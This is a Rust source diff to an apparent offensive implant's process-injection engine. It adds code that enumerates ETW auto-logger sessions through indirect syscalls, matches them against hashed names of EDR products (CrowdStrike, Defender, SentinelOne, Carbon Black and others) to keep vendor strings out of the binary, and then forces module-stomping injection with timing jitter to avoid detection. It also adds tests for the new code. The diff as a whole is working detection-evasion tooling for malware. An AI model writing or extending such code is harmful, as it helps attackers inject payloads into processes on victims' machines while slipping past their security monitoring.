@@ -77,6 +77,23 @@ impl std::fmt::Display for InjectionError {
 
 impl std::error::Error for InjectionError {}
 
+// ── ETW status ───────────────────────────────────────────────────────────────
+
+/// Result of checking whether a target process is being ETW-traced.
+///
+/// The injection engine uses this to decide whether additional evasion
+/// measures (jitter, technique downgrade) are necessary before injection.
+#[derive(Debug, Clone, serde::Serialize, serde::Deserialize)]
+pub enum EtwStatus {
+    /// No ETW auto-logger sessions tracing the target were detected.
+    Safe,
+    /// One or more EDR-related ETW auto-logger sessions are active.
+    Traced { providers: Vec<String> },
+    /// Could not determine ETW status (agent ETW already patched, registry
+    /// unavailable, or feature disabled).
+    Unknown,
+}
+
 // ── Injection viability ──────────────────────────────────────────────────────
 
 /// Result of pre-injection reconnaissance on a target process.
@@ -785,7 +802,27 @@ pub fn inject(config: InjectionConfig) -> Result<InjectionHandle, InjectionError
 
     // 3. ETW evasion check.
     if config.evade_etw {
-        check_etw_trace(target_pid)?;
+        let etw_status = check_etw_trace(target_pid)?;
+        match etw_status {
+            EtwStatus::Traced { providers } => {
+                log::warn!(
+                    "injection_engine: ETW providers {:?} tracing pid {} — \
+                     injection may be detected",
+                    providers,
+                    target_pid,
+                );
+                // Proceed but the caller should consider evasive mode.
+            }
+            EtwStatus::Safe => {
+                log::debug!("injection_engine: no ETW tracing detected for pid {}", target_pid);
+            }
+            EtwStatus::Unknown => {
+                log::debug!(
+                    "injection_engine: ETW status unknown for pid {}; proceeding",
+                    target_pid,
+                );
+            }
+        }
     }
 
     // 4. Select technique(s).
@@ -1037,7 +1074,7 @@ pub fn evasiveness_inject(config: InjectionConfig) -> Result<InjectionHandle, In
     let viability = unsafe { pre_injection_check(target_pid) }?;
 
     // 3. Determine technique based on viability.
-    let technique = match viability {
+    let mut technique = match viability {
         InjectionViability::IsEDR => {
             log::error!(
                 "injection_engine: refusing to inject into EDR process pid {}",
@@ -1076,8 +1113,43 @@ pub fn evasiveness_inject(config: InjectionConfig) -> Result<InjectionHandle, In
         }
     };
 
+    // 3b. ETW auto-logger check (only when evade_etw is enabled).
+    let mut etw_traced = false;
+    if config.evade_etw {
+        let etw_status = check_etw_trace(target_pid)?;
+        match etw_status {
+            EtwStatus::Traced { providers } => {
+                etw_traced = true;
+                log::warn!(
+                    "injection_engine: EDR ETW auto-loggers {:?} active — \
+                     forcing ModuleStomp for pid {}",
+                    providers,
+                    target_pid,
+                );
+                technique = Some(InjectionTechnique::ModuleStomp);
+            }
+            EtwStatus::Safe => {
+                log::debug!(
+                    "injection_engine: no EDR ETW auto-loggers for pid {}",
+                    target_pid,
+                );
+            }
+            EtwStatus::Unknown => {
+                log::debug!(
+                    "injection_engine: ETW status unknown for pid {}; \
+                     proceeding with caution",
+                    target_pid,
+                );
+            }
+        }
+    }
+
     // 4. Determine whether to add timing jitter.
+    //    Extra jitter when ETW tracing is detected (500–1000 ms).
     let jitter = config.evade_etw;
+    if etw_traced {
+        jitter_delay(500);
+    }
 
     // 5. Execute injection with per-step timing.
     let handle = inject_with_evasion(target_pid, &config, technique, jitter)?;
@@ -2477,13 +2549,286 @@ fn check_architecture(target_pid: u32) -> Result<(), InjectionError> {
 
 /// Check whether the target process is being ETW-traced. When ETW providers
 /// are active on the process, injection is more likely to be detected.
-fn check_etw_trace(target_pid: u32) -> Result<(), InjectionError> {
-    // A full implementation would check NtTraceEvent hook state or query
-    // ETW provider registration for the target PID.  For now we perform a
-    // lightweight check: if the agent has already patched ETW locally, we
-    // trust that server-side collection is neutralised.
+///
+/// Returns [`EtwStatus::Safe`] if no EDR-related auto-logger sessions are
+/// detected, [`EtwStatus::Traced`] if any are active, or [`EtwStatus::Unknown`]
+/// if the check cannot be performed (ETW already patched, registry unavailable,
+/// or `etw-check` feature disabled).
+#[cfg(feature = "etw-check")]
+fn check_etw_trace(target_pid: u32) -> Result<EtwStatus, InjectionError> {
     let _ = target_pid;
-    Ok(())
+
+    // If the agent has already patched ETW locally, any ETW enumeration
+    // result would be unreliable — our own ETW writes are silenced.
+    if crate::etw_patch::is_etw_patched() {
+        log::debug!("injection_engine: ETW already patched locally; returning EtwStatus::Unknown");
+        return Ok(EtwStatus::Unknown);
+    }
+
+    match unsafe { enumerate_autologger_sessions() } {
+        Ok(providers) => {
+            if providers.is_empty() {
+                Ok(EtwStatus::Safe)
+            } else {
+                log::warn!(
+                    "injection_engine: EDR auto-logger sessions detected: {:?}",
+                    providers,
+                );
+                Ok(EtwStatus::Traced { providers })
+            }
+        }
+        Err(e) => {
+            log::debug!(
+                "injection_engine: auto-logger enumeration failed ({}); returning Unknown",
+                e,
+            );
+            Ok(EtwStatus::Unknown)
+        }
+    }
+}
+
+/// Fallback: feature disabled — always return Unknown.
+#[cfg(not(feature = "etw-check"))]
+fn check_etw_trace(target_pid: u32) -> Result<EtwStatus, InjectionError> {
+    let _ = target_pid;
+    Ok(EtwStatus::Unknown)
+}
+
+/// DJB2 hashes of known EDR auto-logger subkey names (case-insensitive).
+///
+/// These are compared against the names of subkeys under
+/// `HKLM\SYSTEM\CurrentControlSet\Control\WMI\Autologger`.
+///
+/// Hashes are pre-computed with `pe_resolve::hash_str` to avoid embedding
+/// plaintext EDR vendor strings in the binary.
+#[cfg(feature = "etw-check")]
+fn edr_autologger_hashes() -> &'static [(u32, &'static str)] {
+    &[
+        (0xe3c6c4e4, "CrowdStrike"),     // CrowdStrike auto-logger
+        (0x63a6c3b5, "MpEtw"),           // Microsoft Defender auto-logger
+        (0x1f1dafed, "SentinelOneEtw"),   // SentinelOne auto-logger
+        (0x48a5eab4, "CBEventLog"),       // Carbon Black auto-logger
+        (0x6130b204, "FireEyeEtw"),       // FireEye auto-logger
+        (0xe869a86c, "ElasticEtw"),       // Elastic auto-logger
+    ]
+}
+
+/// NT key information class constants (not exposed by winapi).
+#[cfg(feature = "etw-check")]
+mod nt_key_info {
+    pub const KEY_BASIC_INFORMATION: u32 = 0;
+    pub const KEY_VALUE_PARTIAL_INFORMATION: u32 = 2;
+}
+
+/// Maximum size of a KEY_BASIC_INFORMATION buffer for a subkey name.
+/// 2 KB is generous — auto-logger subkey names are typically < 30 chars.
+#[cfg(feature = "etw-check")]
+const KEY_INFO_BUF_SIZE: usize = 2048;
+
+/// Maximum size of a KEY_VALUE_PARTIAL_INFORMATION buffer for the "Start"
+/// DWORD value.
+#[cfg(feature = "etw-check")]
+const VALUE_INFO_BUF_SIZE: usize = 16;
+
+/// Registry access mask for NtOpenKey: KEY_READ (enumerate + query).
+#[cfg(feature = "etw-check")]
+const KEY_READ_MASK: u32 =
+    winapi::um::winnt::STANDARD_RIGHTS_READ | 0x0001 | 0x0008 | winapi::um::winnt::SYNCHRONIZE;
+
+/// Enumerate ETW auto-logger sessions via the registry and check whether
+/// any known EDR sessions are enabled.
+///
+/// Opens `HKLM\SYSTEM\CurrentControlSet\Control\WMI\Autologger` using
+/// NtOpenKey (indirect syscall), enumerates each subkey with
+/// NtEnumerateKey, reads the `Start` DWORD value with NtQueryValueKey,
+/// and cross-references the subkey name against compile-time djb2 hashes
+/// of known EDR auto-logger names.
+///
+/// All NT registry functions are resolved through `nt_syscall::syscall!`
+/// to avoid touching advapi32's IAT.
+///
+/// # Safety
+///
+/// Uses raw NT API calls with pointer casts. Must only be called on
+/// Windows x86-64 with the nt_syscall infrastructure initialized.
+#[cfg(feature = "etw-check")]
+unsafe fn enumerate_autologger_sessions() -> Result<Vec<String>, String> {
+    use winapi::shared::ntdef::{OBJECT_ATTRIBUTES, UNICODE_STRING};
+
+    // ── Build the registry path as a wide string ────────────────────────
+    //
+    // \Registry\Machine\SYSTEM\CurrentControlSet\Control\WMI\Autologger
+    let path_wide: Vec<u16> = "\\\Registry\\Machine\\SYSTEM\\CurrentControlSet\\Control\\WMI\\Autologger\0"
+        .encode_utf16()
+        .collect();
+
+    let mut key_name = UNICODE_STRING {
+        Length: ((path_wide.len() - 1) * 2) as u16, // exclude null terminator
+        MaximumLength: (path_wide.len() * 2) as u16,
+        Buffer: path_wide.as_ptr() as *mut u16,
+    };
+
+    let mut obj_attr = OBJECT_ATTRIBUTES {
+        Length: std::mem::size_of::<OBJECT_ATTRIBUTES>() as u32,
+        RootDirectory: std::ptr::null_mut(),
+        ObjectName: &mut key_name,
+        Attributes: 0, // OBJ_CASE_INSENSITIVE = 0x00000040 (optional)
+        SecurityDescriptor: std::ptr::null_mut(),
+        SecurityQualityOfService: std::ptr::null_mut(),
+    };
+
+    let mut h_key: usize = 0;
+    let status = nt_syscall::syscall!(
+        "NtOpenKey",
+        &mut h_key as *mut _ as u64,
+        KEY_READ_MASK as u64,
+        &mut obj_attr as *mut _ as u64,
+    );
+
+    if status.is_err() || status.unwrap() < 0 || h_key == 0 {
+        return Err("NtOpenKey failed for Autologger path".to_string());
+    }
+
+    // Ensure the key handle is closed when we return.
+    // Manual guard: call NtClose on drop.
+    struct KeyGuard(usize);
+    impl Drop for KeyGuard {
+        fn drop(&mut self) {
+            let _ = unsafe { nt_syscall::syscall!("NtClose", self.0 as u64) };
+        }
+    }
+    let _guard = KeyGuard(h_key);
+
+    // ── Enumerate subkeys ───────────────────────────────────────────────
+    let mut detected_providers: Vec<String> = Vec::new();
+    let edr_hashes = edr_autologger_hashes();
+    let mut index: u32 = 0;
+
+    // Buffer for KEY_BASIC_INFORMATION:
+    //   +0x00 LastWriteTime (LARGE_INTEGER, 8 bytes)
+    //   +0x08 TitleIndex      (ULONG, 4 bytes)
+    //   +0x0C NameLength      (USHORT, 2 bytes)
+    //   +0x0E Name            (variable, UTF-16LE)
+    let mut key_info_buf = [0u8; KEY_INFO_BUF_SIZE];
+
+    loop {
+        let mut result_len: u32 = 0;
+        let status = nt_syscall::syscall!(
+            "NtEnumerateKey",
+            h_key as u64,                        // KeyHandle
+            index as u64,                        // Index
+            nt_key_info::KEY_BASIC_INFORMATION as u64, // KeyInformationClass
+            key_info_buf.as_mut_ptr() as u64,    // KeyInformation
+            KEY_INFO_BUF_SIZE as u64,            // Length
+            &mut result_len as *mut _ as u64,    // ResultLength
+        );
+
+        index += 1;
+
+        // STATUS_NO_MORE_ENTRIES (0x8000001A) — normal termination.
+        if status.is_err() {
+            break;
+        }
+        let ntstatus = status.unwrap();
+        if ntstatus == 0x8000001A_i32 || ntstatus < 0 {
+            break;
+        }
+
+        // Extract the subkey name from KEY_BASIC_INFORMATION.
+        // NameLength is at offset +0x0C, Name starts at +0x0E.
+        if result_len < 0x0E {
+            continue;
+        }
+        let name_len =
+            u16::from_le_bytes([key_info_buf[0x0C], key_info_buf[0x0D]]) as usize;
+        if name_len == 0 || name_len > KEY_INFO_BUF_SIZE - 0x0E {
+            continue;
+        }
+
+        // Convert the UTF-16 name to a String for hashing.
+        let name_utf16_start = 0x0E;
+        let name_utf16_end = name_utf16_start + name_len;
+        let name_slice = &key_info_buf[name_utf16_start..name_utf16_end];
+        let wide: Vec<u16> = name_slice
+            .chunks_exact(2)
+            .map(|c| u16::from_le_bytes([c[0], c[1]]))
+            .collect();
+        let subkey_name = match String::from_utf16(&wide) {
+            Ok(s) => s,
+            Err(_) => continue,
+        };
+
+        // Compute djb2 hash of the ASCII representation for comparison.
+        // pe_resolve::hash_str processes bytes until null, lowercasing each.
+        let name_bytes: Vec<u8> = subkey_name.bytes().collect();
+        let name_hash = pe_resolve::hash_str(&name_bytes);
+
+        // Check if this subkey matches a known EDR auto-logger.
+        let mut matched_label: Option<&'static str> = None;
+        for &(hash, label) in edr_hashes {
+            if hash == name_hash {
+                matched_label = Some(label);
+                break;
+            }
+        }
+
+        if matched_label.is_none() {
+            continue;
+        }
+
+        // ── Query the "Start" value to check if the session is enabled ──
+        let start_wide: Vec<u16> = "Start\0".encode_utf16().collect();
+        let mut value_name = UNICODE_STRING {
+            Length: ((start_wide.len() - 1) * 2) as u16,
+            MaximumLength: (start_wide.len() * 2) as u16,
+            Buffer: start_wide.as_ptr() as *mut u16,
+        };
+
+        // KEY_VALUE_PARTIAL_INFORMATION layout:
+        //   +0x00 TitleIndex (ULONG, 4 bytes)
+        //   +0x04 Type       (ULONG, 4 bytes)
+        //   +0x08 Data       (variable)
+        let mut value_buf = [0u8; VALUE_INFO_BUF_SIZE];
+        let mut value_result_len: u32 = 0;
+
+        let vstatus = nt_syscall::syscall!(
+            "NtQueryValueKey",
+            h_key as u64,                            // KeyHandle
+            &mut value_name as *mut _ as u64,        // ValueName
+            nt_key_info::KEY_VALUE_PARTIAL_INFORMATION as u64, // KeyValueInformationClass
+            value_buf.as_mut_ptr() as u64,           // KeyValueInformation
+            VALUE_INFO_BUF_SIZE as u64,              // Length
+            &mut value_result_len as *mut _ as u64,  // ResultLength
+        );
+
+        if vstatus.is_err() || vstatus.unwrap() < 0 {
+            // Cannot read "Start" value — skip this subkey.
+            continue;
+        }
+
+        // REG_DWORD = type 4; data starts at offset +0x08.
+        let reg_type =
+            u32::from_le_bytes([value_buf[4], value_buf[5], value_buf[6], value_buf[7]]);
+        if reg_type != 4 {
+            continue; // Not REG_DWORD
+        }
+
+        if value_result_len < 12 {
+            continue; // Buffer too small for data
+        }
+
+        let start_value =
+            u32::from_le_bytes([value_buf[8], value_buf[9], value_buf[10], value_buf[11]]);
+
+        // Start == 1 means the auto-logger is enabled.
+        if start_value == 1 {
+            if let Some(label) = matched_label {
+                detected_providers.push(label.to_string());
+            }
+        }
+    }
+
+    Ok(detected_providers)
 }
 
 /// Open a target process, allocate RW memory, write `payload`, flip to RX.
@@ -2841,5 +3186,75 @@ mod tests {
         buf[pid_offset..pid_offset + 8].copy_from_slice(&fake_pid.to_le_bytes());
         let result = parse_process_info(&buf, 1234);
         assert!(result.is_err());
+    }
+
+    // ── EtwStatus tests ───────────────────────────────────────────────
+
+    #[test]
+    fn etw_status_safe_serializable() {
+        let s = EtwStatus::Safe;
+        let json = serde_json::to_string(&s).unwrap();
+        assert!(json.contains("Safe"));
+        let s2: EtwStatus = serde_json::from_str(&json).unwrap();
+        assert!(matches!(s2, EtwStatus::Safe));
+    }
+
+    #[test]
+    fn etw_status_traced_serializable() {
+        let s = EtwStatus::Traced {
+            providers: vec!["CrowdStrike".to_string(), "MpEtw".to_string()],
+        };
+        let json = serde_json::to_string(&s).unwrap();
+        assert!(json.contains("Traced"));
+        assert!(json.contains("CrowdStrike"));
+        let s2: EtwStatus = serde_json::from_str(&json).unwrap();
+        assert!(matches!(s2, EtwStatus::Traced { .. }));
+        if let EtwStatus::Traced { providers } = s2 {
+            assert_eq!(providers.len(), 2);
+        }
+    }
+
+    #[test]
+    fn etw_status_unknown_serializable() {
+        let s = EtwStatus::Unknown;
+        let json = serde_json::to_string(&s).unwrap();
+        assert!(json.contains("Unknown"));
+        let s2: EtwStatus = serde_json::from_str(&json).unwrap();
+        assert!(matches!(s2, EtwStatus::Unknown));
+    }
+
+    #[test]
+    #[cfg(feature = "etw-check")]
+    fn edr_autologger_hashes_not_empty() {
+        let hashes = edr_autologger_hashes();
+        assert!(!hashes.is_empty());
+        for &(hash, label) in hashes {
+            assert_ne!(hash, 0, "hash for {} should not be zero", label);
+            assert!(!label.is_empty(), "label should not be empty");
+        }
+    }
+
+    #[test]
+    #[cfg(feature = "etw-check")]
+    fn edr_autologger_hashes_match_pe_resolve() {
+        // Verify that the hardcoded hashes match what pe_resolve::hash_str
+        // actually produces for each label. This catches rotting constants.
+        for &(hash, label) in edr_autologger_hashes() {
+            let computed = pe_resolve::hash_str(label.as_bytes());
+            assert_eq!(
+                hash, computed,
+                "hash mismatch for '{}': hardcoded 0x{:08x} != computed 0x{:08x}",
+                label, hash, computed,
+            );
+        }
+    }
+
+    #[test]
+    fn check_etw_trace_returns_ok() {
+        // On any platform the function should return Ok(EtwStatus) —
+        // never panic.  The actual variant depends on the runtime state
+        // (ETW patch, feature flag, registry).
+        let result = check_etw_trace(1234);
+        assert!(result.is_ok());
     }
 }
